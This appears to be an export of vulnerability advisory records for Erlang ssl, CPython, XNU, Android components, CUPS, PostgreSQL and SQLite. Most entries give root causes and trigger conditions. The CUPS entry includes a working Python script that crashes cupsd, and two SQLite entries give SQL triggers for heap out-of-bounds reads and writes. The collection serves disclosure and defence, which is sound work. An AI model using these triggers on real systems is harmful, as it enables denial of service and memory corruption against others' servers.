items.title_raw: [MEDIUM] Improper certificate validation in Erlang/OTP ssl
items.title_display: Improper certificate validation in Erlang/OTP ssl
items.body_markdown:
Vulnerability Details:

An improper certificate validation issue in the Erlang/OTP `ssl` application allows a client holding a certificate trusted by one SNI virtual host to authenticate to a second SNI virtual host on the same listener by resuming its TLS 1.2 session there. A server serving several SNI names from one listen socket through `sni_fun` or `sni_hosts` keeps a single pre-TLS 1.3 session cache per listener and does not bind a cached session to the SNI name or client trust policy that established it, so on an abbreviated handshake the cached client certificate is accepted without being revalidated against the higher-trust CA.

This affects the `ssl` application from OTP 18.0 (ssl 7.0) onward.

More information available at https://github.com/erlang/otp/security/advisories/GHSA-2g23-cgjh-34gq

items.title_raw: [CRITICAL] UAF in cpython affecting multiple decompressors
items.title_display: UAF in cpython affecting multiple decompressors
items.body_markdown:
Use-after-free (UAF) was possible in the `lzma.LZMADecompressor`, `bz2.BZ2Decompressor`, and `gzip.GzipFile` when a memory allocation fails with a `MemoryError` and the decompression instance is re-used. This scenario can be triggered if the process is under memory pressure. The fix cleans up the dangling pointer in this specific error condition.

The vulnerability is only present if the program re-uses decompressor instances across multiple decompression calls even after a `MemoryError` is raised during decompression. Using the helper functions to one-shot decompress data such as `lzma.decompress()`, `bz2.decompress()`, `gzip.decompress()`, and `zlib.decompress()` are not affected as a new decompressor instance is used per call. If the decompressor instance is not re-used after an error condition, this usage is similarly not vulnerable.

items.title_raw: [HIGH] sysv_msg queue hijack in XNU
items.title_display: sysv_msg queue hijack in XNU
items.body_markdown:
## Summary

`msgctl()` has a race condition allowing a process to hijack sysv_msg queues during creation.

## Details

The `IPC_SET` case of `msgctl()` drops the `SYSV_MSG_SUBSYS` mutex and reacquires it. During the unlock window, another thread can perform `IPC_RMID` and free the slot, then a `msgget` can reuse the same index. After relocking, msgctl modifies the permission fields based on the earlier authorization check for the old queue, altering the permissions for the newly allocated queue.

1. Thread A: `msgctl(Q1, IPC_SET)` passes auth check, unlocks for copyin
2. Thread B: `msgctl(Q1, IPC_RMID)` frees slot (sets msg_qbytes=0)
3. Thread C: `msgget()` reuses slot for new queue Q2 with new owner
4. Thread A: relocks and writes attacker's uid/gid/mode to Q2

## Proof of Concept

[47.c](https://github.com/user-attachments/files/28347777/47.c)

## Impact

An unprivileged userspace process can read and write sysv_msg queues created by another process.

## Timeline

Reported: 2026-03-12
Acknowledged: 2026-03-13
Fixed: [2026-05-11](https://support.apple.com/en-us/127115)
[CVE-2026-28986](https://www.cve.org/CVERecord?id=CVE-2026-28986)

items.body_markdown:
## Summary

Creating an IPsec policy on a PF_KEY socket can trigger a heap out-of-bounds write in the XNU Kernel as the root user.

## Details

The `key_sp2msg` function in `xnu/bsd/netkey/key.c` serializes an IPsec policy into an mbuf, then incorrectly advances the buffer pointer by `src.ss_len` instead of `dst.ss_len`. The total buffer size is computed from src + dst lengths, so when there are multiple ipsecrequest entries, subsequent writes exceed the allocated buffer and trigger an out-of-bounds kernel heap write.

## Proof of Concept

[627.c](https://github.com/user-attachments/files/28347441/627.c)
[panic.txt](https://github.com/user-attachments/files/28347443/panic.txt)

## Impact

Out-of-bounds write in kernel heap mbuf memory during PF_KEY message construction can corrupt adjacent memory, potentially leading to kernel panic or code execution. Root access is required to install IPsec policies, but no other entitlements are required.

items.title_raw: [HIGH] Use-after-free in Android LWIS lwis_device_external_event_emit
items.title_display: Use-after-free in Android LWIS lwis_device_external_event_emit
items.body_markdown:
### Summary

Root Cause: `lwis_device_external_event_emit` drops
`lwis_client->event_lock` and then keeps using the raw `lwis_client`
pointer, which a concurrent close can free in the meantime.

### Details

In `google-modules/lwis/lwis_event.c`, the function iterates
`lwis_dev->clients` without holding a lock that protects either the list
or client lifetime (lines 1074-1079), reads `client_event_state` under
`lwis_client->event_lock` (lines 1080-1090), then drops that lock and
calls `client_event_push_back(lwis_client, ...)` (line 1102). If the
client is concurrently closed and freed via
`lwis_release -> release_client`
(`google-modules/lwis/lwis_device.c:251-307`, 221-246), the
`lwis_client` pointer is dangling. `client_event_push_back`
(`lwis_event.c:569+`) dereferences it to take `event_lock` and write to
its `event_queue`, and the subsequent
`lwis_transaction_event_trigger(lwis_client, ...)` at line 1112
dereferences the freed pointer again.

The trigger is:

- A process opens LWIS subscriber and trigger devices (`/dev/lwis*`) and
  issues `LWIS_IOC_EVENT_CONTROL_SET` to enable
  `LWIS_EVENT_CONTROL_FLAG_QUEUE_ENABLE` for a cross-device event,
  reaching `lwis_client_event_control_set -> client_event_subscribe`.
  This sets up the subscription so that `subscribe_work_func` will call
  `lwis_device_external_event_emit` on the subscriber device when the
  trigger device emits the event.
- An external event emission occurs, for example via hardware IRQ or a
  driver path leading to `device_event_emit_impl` on the trigger device,
  causing `subscribe_work_func` to invoke
  `lwis_device_external_event_emit(subscriber_dev, event_id, ...)`.
- Race window: after the function determines `emit = true` and unlocks
  `lwis_client->event_lock` (line 1090), but before it calls
  `client_event_push_back` (line 1102), userspace closes the subscriber
  client FD, executing
  `lwis_release -> release_client -> cleanup_client -> list_del ->
  kfree(lwis_client)`.

A local app with access to LWIS device nodes can therefore trigger a
kernel use-after-free write, likely leading to kernel crash and
potentially privilege escalation.

items.title_raw: [HIGH] Out-of-bounds-write in Android LWIS lwis_io_buffer_write
items.title_display: Out-of-bounds-write in Android LWIS lwis_io_buffer_write
items.body_markdown:
### Summary

Root Cause: `lwis_io_buffer_write` copies user-provided bytes into a
DMA-buf vmap at `kernel_address + offset` without ever checking that
`offset + size_in_bytes` falls inside the mapped buffer.

### Details

In `google-modules/lwis/lwis_io_buffer.c`, `lwis_io_buffer_write` (lines
24-31) performs `memcpy(kernel_address + offset, bytes, size_in_bytes)`
with no bounds check. In the transaction and periodic IO paths,
`construct_io_entry` sets up the mapping and deep-copies the bytes, but
never validates size or offset against the `dma_buf` length, so the
write can land beyond the DMA buffer's mapped region.

The trigger is:

- Open the LWIS device and submit a transaction or periodic IO via
  `LWIS_CMD_TRANSACTION_SUBMIT` (or equivalent), with an IO entry of
  type `LWIS_IO_ENTRY_WRITE_TO_BUFFER`.
- `fd`: a valid `dma_buf` file descriptor, so that `dma_buf_get`,
  `vmap` and `begin_cpu_access` all succeed in `construct_io_entry`.
- `bytes`: a userspace pointer to at least `size_in_bytes` bytes;
  `construct_io_entry` does `kmalloc(size_in_bytes)` and
  `copy_from_user`.
- `size_in_bytes`: small enough that the allocation succeeds (a few KB
  to MB).
- `offset`: chosen so that `offset + size_in_bytes` exceeds the
  `dma_buf`'s true size.

`construct_io_entry` then prepares a `struct pdma_buffer` with an
`iosys_map`, and after dispatch `lwis_io_buffer_write` copies past the
end of the mapping. The attacker writes controlled data at an arbitrary
relative offset from the vmap base, which from a privileged camera HAL
process is a kernel privilege escalation primitive.

The synchronous `reg_io` path also accepts `WRITE_TO_BUFFER` but does
not prepare the mapping, leading to an immediate invalid pointer
dereference and an unsafe `memcpy` from a userspace pointer.

items.title_raw: [HIGH] Heap based overflow in CUPS `get_options()`
items.title_display: Heap based overflow in CUPS `get_options()`
items.body_markdown:
Vulnerability has been disclosed as [GHSA-6qxf-7jx6-86fh](https://github.com/OpenPrinting/cups/security/advisories/GHSA-6qxf-7jx6-86fh)

## Summary

There is a heap-based buffer overflow in the CUPS scheduler when building filter option strings from job attributes.

## Details

Note file references are accurate for the latest release version v2.4.16, this bug is also present on main at time of writing.

The size calculation for the options string uses ipp_length which excludes URI attributes, but serialization still writes selected URI attributes (job-uuid, job-authorization-uri).
This allows an attacker who can submit IPP jobs to trigger memory corruption in cupsd by creating malicious large job-uuid or job-authorization-uri attributes.

The root cause in get_options/ipp_length:

In get_options the allocation size for the constructed option string comes from ipp_length(job->attrs) at scheduler/job.c:3912.
ipp_length unconditionally skips URI attributes at scheduler/job.c:4191 and scheduler/job.c:4193.
get_options still permits URI attributes job-uuid and job-authorization-uri (filter exception) at scheduler/job.c:3977 and scheduler/job.c:3995.
URI values are then serialized in the IPP_TAG_URI case with direct writes (*optptr++ = ...) at scheduler/job.c:4118 and scheduler/job.c:4123, without a bounds check, resulting in a potential out of bounds write if the calculated length in ipp_length was insufficient.

## PoC

Following python script constructs a IPP request that triggers this overflow and sends it to a cups server, causing a segfault.

```python
#!/usr/bin/env python3
import argparse
import http.client
import random
import socket
import struct


IPP_VERSION_MAJOR = 2
IPP_VERSION_MINOR = 0
IPP_OP_PRINT_JOB = 0x0002

IPP_TAG_OPERATION = 0x01
IPP_TAG_JOB = 0x02
IPP_TAG_END = 0x03

IPP_TAG_URI = 0x45
IPP_TAG_NAME = 0x42
IPP_TAG_CHARSET = 0x47
IPP_TAG_LANGUAGE = 0x48
IPP_TAG_MIMETYPE = 0x49


def add_attr(buf: bytearray, value_tag: int, name: str, value: str) -> None:
    name_bytes = name.encode("utf-8")
    value_bytes = value.encode("utf-8")
    if len(name_bytes) > 0xFFFF or len(value_bytes) > 0xFFFF:
        raise ValueError(f"attribute too large: {name}")

    buf.append(value_tag)
    buf.extend(struct.pack(">H", len(name_bytes)))
    buf.extend(name_bytes)
    buf.extend(struct.pack(">H", len(value_bytes)))
    buf.extend(value_bytes)


def make_uri(prefix: str, target_len: int) -> str:
    if target_len <= len(prefix):
        return prefix + "A"
    return prefix + ("A" * (target_len - len(prefix)))


def build_ipp_request(host: str, port: int, printer: str, uuid_len: int, auth_len: int, request_id: int) -> bytes:
    printer_uri = f"ipp://{host}:{port}/printers/{printer}"
    job_uuid = make_uri("ipp://u/", uuid_len)
    job_auth_uri = make_uri("ipp://a/", auth_len)

    msg = bytearray()
    msg.extend(struct.pack(">BBHI", IPP_VERSION_MAJOR, IPP_VERSION_MINOR, IPP_OP_PRINT_JOB, request_id))

    msg.append(IPP_TAG_OPERATION)
    add_attr(msg, IPP_TAG_CHARSET, "attributes-charset", "utf-8")
    add_attr(msg, IPP_TAG_LANGUAGE, "attributes-natural-language", "en")
    add_attr(msg, IPP_TAG_URI, "printer-uri", printer_uri)
    add_attr(msg, IPP_TAG_NAME, "requesting-user-name", "attacker")
    add_attr(msg, IPP_TAG_MIMETYPE, "document-format", "application/postscript")

    msg.append(IPP_TAG_JOB)
    add_attr(msg, IPP_TAG_URI, "job-uuid", job_uuid)
    add_attr(msg, IPP_TAG_URI, "job-authorization-uri", job_auth_uri)

    msg.append(IPP_TAG_END)

    document = b"%!PS-Adobe-3.0\n%%Pages: 1\n%%EOF\n"
    return bytes(msg) + document


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Send crafted IPP Print-Job request to trigger URI undercount overflow path.")
    parser.add_argument("--host", default="127.0.0.1", help="CUPS host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8631, help="CUPS port (default: 8631)")
    parser.add_argument("--printer", default="Test1", help="Printer name (default: Test1)")
    parser.add_argument("--uuid-len", type=int, default=12000, help="Length of job-uuid URI value (default: 12000)")
    parser.add_argument("--auth-len", type=int, default=12000, help="Length of job-authorization-uri URI value (default: 12000)")
    parser.add_argument("--request-id", type=int, default=None, help="IPP request-id (default: random)")
    parser.add_argument("--timeout", type=float, default=5.0, help="HTTP timeout in seconds (default: 5.0)")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    request_id = args.request_id if args.request_id is not None else random.randint(1, 2**31 - 1)

    payload = build_ipp_request(args.host, args.port, args.printer, args.uuid_len, args.auth_len, request_id)
    resource = f"/printers/{args.printer}"
    headers = {
        "Content-Type": "application/ipp",
        "Content-Length": str(len(payload)),
        "Connection": "close",
    }

    print(f"[*] Sending crafted Print-Job to ipp://{args.host}:{args.port}{resource}")
    print(f"[*] job-uuid length={args.uuid_len}, job-authorization-uri length={args.auth_len}, payload={len(payload)} bytes")

    try:
        conn = http.client.HTTPConnection(args.host, args.port, timeout=args.timeout)
        conn.request("POST", resource, body=payload, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        print(f"[*] HTTP status: {resp.status} {resp.reason}, response bytes: {len(body)}")
        conn.close()
        return 0
    except (ConnectionError, socket.error, OSError) as exc:
        print(f"[!] Connection failed (expected if cupsd crashed): {exc}")
        return 0


if __name__ == "__main__":
    main()
```

## Impact
Heap-based buffer overflow in cupsd triggerable by any attacker that can submit print jobs.
Crash/DoS is straightforward; memory corruption may be exploitable for code execution.

## Timeline

Acknowledged: 2026-02-13
Fixed: 2026-03-31
CVE-2026-34979
Upstream fix

items.title_raw: [HIGH] Out-of-bounds-write in Android mediaextractor MatroskaSource::read
items.title_display: Out-of-bounds-write in Android mediaextractor MatroskaSource::read
items.body_markdown:
### Summary

Root Cause: The big-endian PCM conversion in `MatroskaSource::read` adds
a byte-based `range_offset()` to a `uint16_t*`, moving the start pointer
by twice as many bytes as intended and writing past the end of the
buffer.

### Details

In `frameworks/av/media/module/extractors/mkv/MatroskaExtractor.cpp`,
the endian-swap loop at lines 1109-1115 advances a `uint16_t*` by
`frame->range_offset()`, which is a byte count. The effective start is
therefore `base + 2 * range_offset`, while the loop still writes
`frame->range_length() / 2` words. Because the valid region after
`set_range` ends at the buffer's end, this overruns the allocation by
exactly `range_offset` bytes.

`range_offset` is non-zero whenever the track is encrypted in a WebM
container: `setWebmBlockCryptoInfo` (lines 651-776) sets it to 1, 9, or
`10 + 4*N` (lines 732, 755, 775).

The conditions are:

- Container EBML docType is `"webm"`, so `mIsWebm` is true (constructor,
  lines 1353-1355).
- The audio track has CodecID `A_PCM/INT/BIG` with BitDepth 16, so
  `addTracks` sets MIME `audio/raw`,
  `AMEDIAFORMAT_KEY_PCM_BIG_ENDIAN=1` and
  `AMEDIAFORMAT_KEY_BITS_PER_SAMPLE=16` (lines 2180-2187, 2217-2220).
- The track has a ContentEncoding with Encryption (`initTrackInfo`,
  lines 1917-1939), so `readBlock` invokes `setWebmBlockCryptoInfo`
  (lines 842-846).
- A subsequent `MatroskaSource::read()` reaches the PCM path
  (`mType == PCM`) and runs the faulty loop.

Crafting the encryption header to use partitioned mode with many
partitions allows overflows of roughly 1030 bytes.

Playing a crafted media file corrupts heap memory in the mediaextractor
process; this is reachable, for example, by playing a `.webm` received
from a messaging app.

items.title_raw: [HIGH] Heap buffer-overflow in Android Bluetooth l2c_fcr_clone_buf
items.title_display: Heap buffer-overflow in Android Bluetooth l2c_fcr_clone_buf
items.body_markdown:
### Summary

Root Cause: `l2c_fcr_clone_buf` computes its allocation size in a 16-bit
integer, so a large `no_of_bytes` wraps the sum and produces an
undersized buffer that the following `memcpy` overflows.

### Details

In `packages/modules/Bluetooth/system/stack/l2cap/l2c_fcr.cc`, the
allocation size is computed as
`buf_size = no_of_bytes + sizeof(BT_HDR) + new_offset + L2CAP_FCS_LEN`.
When `no_of_bytes` is large the sum exceeds 65535 and wraps, so
`osi_malloc(buf_size)` returns a very small allocation. The subsequent
`memcpy` of `no_of_bytes` bytes then writes well past the end of that
buffer.

This is reachable from the LE CoC transmit path, where `new_offset` is a
small constant and `no_of_bytes` is derived from the peer's negotiated
MPS:

- A BLE LE Credit-Based Connection is established in which the peer
  negotiates `mps >= 65515`, which passes validation against
  `L2CAP_LE_MAX_MPS` (65533). In `l2c_ble.cc`, `p_ccb->tx_mps` is set to
  `peer_conn_cfg.mps` with no further cap.
- An unprivileged app writes a single message of length
  `>= (peer mps - 4)` on the LE CoC socket. `btif_sock_l2cap` caps each
  write to `sock->tx_mtu`, which comes from the connection open
  parameters, so large writes are permitted once negotiated.
- `l2c_lcc_get_next_xmit_sdu_seg` computes
  `no_of_bytes_to_send = min(p_buf->len, (peer mps - 4))` and calls
  `l2c_fcr_clone_buf` with `new_offset` in {`L2CAP_MIN_OFFSET` (13),
  `L2CAP_LCC_OFFSET` (15)}.
- For `no_of_bytes` around 65529, `buf_size` is about 65554, which wraps
  the `uint16_t`, and roughly 65529 bytes are copied into the resulting
  tiny allocation.

The overflowed bytes come directly from app data, so this is controlled
heap corruption inside the Bluetooth process, which holds
`CAP_NET_ADMIN`, `CAP_NET_RAW` and `CAP_NET_BIND_SERVICE`, and whose
SELinux domain permits `SIOCDEVPRIVATE` ioctls to Wi-Fi driver private
interfaces. That combination makes this a meaningful privilege
escalation primitive.

items.title_display: UAF in Android mali GPU driver
items.body_markdown:
## Location

`kbase_kcpu_cqs_set_process` in `kernel/google-modules/gpu/mali_kbase/csf/mali_kbase_csf_kcpu.c`

## Description

The function dereferences the pointer “evt” after releasing its underlying kernel mapping via kbase_phy_alloc_mapping_put(). Specifically, after writing to evt and calling put (line 923), it evaluates KBASE_KTRACE_ADD_CSF_KCPU(...) with evt[BASEP_EVENT32_ERR_OFFSET/sizeof(u32)] (lines 925-926). The KTRACE macro captures its argument by value (mali_kbase_debug_ktrace_csf.h:186), so the dereference occurs post-put. If put() drops the last references, kbase_mem_kref_free() tears down the permanent mapping (mali_kbase_mem.c:1766-1769), and kbase_phy_alloc_mapping_term() unmaps/frees the mapping (mali_kbase_mem_linux.c:229-234), making “evt” invalid. This yields a use-after-free read and likely kernel page fault.


## Trigger Conditions

- An unprivileged app creates a Mali kbase GPU context and a KCPU command queue, and allocates a CQS sync object (backed by a kbase_mem_phy_alloc with permanent_map) to obtain its GPU address.
- It enqueues a BASE_KCPU_COMMAND_TYPE_CQS_SET referencing that address so the kernel will call kbase_phy_alloc_mapping_get(), write to evt, and then kbase_phy_alloc_mapping_put().
- Concurrently, the app frees/unmaps the underlying CQS allocation/region before the kernel reaches the KTRACE line, so the put() drops the final krefs and invokes kbase_mem_kref_free() which calls kbase_phy_alloc_mapping_term() to unmap the permanent_map.
- Immediately after put(), KBASE_KTRACE_ADD_CSF_KCPU dereferences evt to fetch the error value, causing a UAF read that can fault and crash the kernel.

The race is feasible on SMP since the userspace free can happen between the kernel’s get and the KTRACE dereference.


## Impact analysis

This can be driven by an unprivileged app through interaction with /dev/mali0 on Pixel devices.
At minimum, this vulnerability yields an unprivileged local DoS.
It also has potential for information disclosure via ktrace, but this requires root.

items.title_raw: [CRITICAL] Heap buffer-overflow in PostgreSQL pgp_parse_pubenc_sesskey
items.title_display: Heap buffer-overflow in PostgreSQL pgp_parse_pubenc_sesskey
items.body_markdown:
**Location:** `contrib/pgcrypto/pgp-pubdec.c:226:229` in function `pgp_parse_pubenc_sesskey`


### Description

The function copies the decrypted session key into a fixed-size buffer without bounding the copy length. After unpadding the PKCS#1 v1.5 block, it sets `ctx->sess_key_len = msglen - 3` and does `memcpy(ctx->sess_key, msg + 1, ctx->sess_key_len)` (`contrib/pgcrypto/pgp-pubdec.c:227-229`). However, `ctx->sess_key` is only `PGP_MAX_KEY` (32) bytes long (`contrib/pgcrypto/pgp.h:171-172`, `contrib/pgcrypto/pgp.h:112`). Since `msglen` is derived from the RSA/ElGamal plaintext length and `control_cksum()` imposes no upper bound (`contrib/pgcrypto/pgp-pubdec.c:80-93`), an attacker can supply a crafted ciphertext and matching key to make `ctx->sess_key_len` much larger than 32, causing an out-of-bounds write.

### Code Context

```
	ctx->cipher_algo = *msg;
	ctx->sess_key_len = msglen - 3;
	memcpy(ctx->sess_key, msg + 1, ctx->sess_key_len);

```

items.title_raw: [MEDIUM] Heap out-of-bounds read in SQLite zipfileGetEntry
items.title_display: Heap out-of-bounds read in SQLite zipfileGetEntry
items.body_markdown:
Vulnerability Details:

A heap out-of-bounds read in SQLite's zipfileGetEntry could allow leaking of sensitive heap data including pointers when attackers can perform SQL queries with the zipfile module enabled (as is default on many platforms).  

The memcpy in sqlite3/ext/misc/zipfile.c : zipfileGetEntry copies pNew->cds.szCompressed bytes from &aBlob[pNew->iDataOff] without checking that iDataOff + szCompressed ≤ nBlob, enabling an out-of-bounds read.

Example trigger:
```
SELECT * FROM zipfile(X'504b03041400000000000000000000000000100000001000000001000100414243434343504b010214001400000000000000000000000000ffff0000ffff000001000000000000000000000000000000000041504b050600000000010001002f000000240000000000');
```

---

Fixed: 2025-08-04
[Upstream Fix](https://sqlite.org/src/vinfo/642e89191deaf75d?diff=2&proof=858002589)

items.title_raw: [HIGH] Heap out-of-bounds-write in SQLite zipfileAppendEntry
items.title_display: Heap out-of-bounds-write in SQLite zipfileAppendEntry
items.body_markdown:
Vulnerability Details:

A heap out of bounds write in SQLite's zipfileAppendEntry could allow code execution when attackers can perform SQL queries with the zip module enabled (as is default on many platforms).

The call to zipfileSerializeLFH in zipfileAppendEntry writes pCds->nFile bytes of zFile into a fixed-size (ZIPFILE_BUFFER_SIZE=64K) buffer at offset 30 without checking that nFile <= (64K−30). A sufficiently long file name causes a heap buffer overflow.

Example trigger:
```
CREATE VIRTUAL TABLE t USING zipfile('out.zip');
INSERT INTO t(name,mode,mtime,sz,rawdata,data,method) VALUES(printf('%.*c', 65520, 'A'), NULL,0,NULL,NULL,X'00',NULL);
```
